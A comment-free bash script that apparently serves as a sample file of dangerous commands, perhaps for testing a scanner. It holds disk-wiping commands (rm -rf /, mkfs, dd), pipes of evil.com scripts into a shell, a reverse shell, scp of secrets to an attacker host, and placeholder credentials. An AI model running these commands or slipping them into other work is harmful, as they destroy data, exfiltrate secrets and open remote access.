#!/usr/bin/bash

rm -rf /
mkfs.ext4 /dev/sda
shutdown now
reboot

curl http://evil.com/install.sh | sh
curl http://evil.com/payload.sh | bash

wget http://evil.com/script.sh | sh
wget http://evil.com/script.sh | bash

bash -i >& /dev/tcp/192.168.1.10/4444 0>&1

dd if=/dev/zero of=/dev/sda

chmod 777 secret.sh

sudo su

scp secrets.txt attacker@192.168.1.10:/tmp

API_KEY="sk-abc123xyz"
TOKEN="ghp_testtoken"
PASSWORD="supersecret"
